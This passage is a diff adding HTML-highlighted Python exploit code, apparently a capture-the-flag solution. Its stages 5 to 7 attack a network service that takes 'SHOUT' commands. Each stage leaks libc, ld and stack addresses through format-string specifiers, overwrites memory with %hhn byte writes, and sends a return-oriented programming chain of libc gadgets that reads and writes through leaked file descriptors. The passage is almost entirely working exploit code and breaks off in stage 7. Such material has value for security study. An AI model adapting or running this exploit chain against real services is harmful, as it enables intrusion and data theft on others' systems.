+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x440</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="c1">#####################################
+############## STAGE 5 ##############
+#####################################
+</span><span class="n">pfd</span> <span class="o">=</span> <span class="n">fd</span> <span class="o">+</span> <span class="mi">1</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'SHOUT %216$p.%217$p.%218$p.%249$s'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x270b3</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">leak</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]:</span>
+    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">):</span>
+        <span class="n">fd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ld : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ld</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fd: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">fd</span><span class="p">))</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">pivot</span>
+
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'SHOUT '</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">53</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">((</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="n">i</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">54</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x5f</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span> <span class="o">+</span> <span class="s">'B'</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ld</span> <span class="o">+</span> <span class="mh">0x1948</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="n">prbp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x00000000000256c0</span>
+<span class="n">prdi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000026b72</span>
+<span class="n">prsi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000027529</span>
+<span class="n">prdxp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000162866</span>
+<span class="n">lr</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x000000000005aa48</span>
+<span class="n">read</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x111130</span>
+<span class="n">write</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1111d0</span>
+<span class="n">writable</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ee000</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x228</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x440</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="c1">#####################################
+############## STAGE 6 ##############
+#####################################
+</span><span class="n">pfd</span> <span class="o">=</span> <span class="n">fd</span> <span class="o">+</span> <span class="mi">1</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'SHOUT %216$p.%217$p.%218$p.%249$s'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x270b3</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">leak</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]:</span>
+    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">):</span>
+        <span class="n">fd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ld : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ld</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fd: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">fd</span><span class="p">))</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">pivot</span>
+
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'SHOUT '</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">53</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">((</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="n">i</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">54</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x5f</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span> <span class="o">+</span> <span class="s">'B'</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ld</span> <span class="o">+</span> <span class="mh">0x1948</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="n">prbp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x00000000000256c0</span>
+<span class="n">prdi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000026b72</span>
+<span class="n">prsi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000027529</span>
+<span class="n">prdxp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000162866</span>
+<span class="n">lr</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x000000000005aa48</span>
+<span class="n">read</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x111130</span>
+<span class="n">write</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1111d0</span>
+<span class="n">writable</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ee000</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x228</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x440</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="c1">#####################################
+############## STAGE 7 ##############
+#####################################
+</span><span class="k">print</span> <span class="s">"77777777777777"</span>
+<span class="k">print</span> <span class="s">"77777777777777"</span>
+<span class="k">print</span> <span class="s">"77777777777777"</span>
+<span class="n">pfd</span> <span class="o">=</span> <span class="n">fd</span> <span class="o">+</span> <span class="mi">1</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'SHOUT %218$p.%219$p.%220$p.%222$p'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
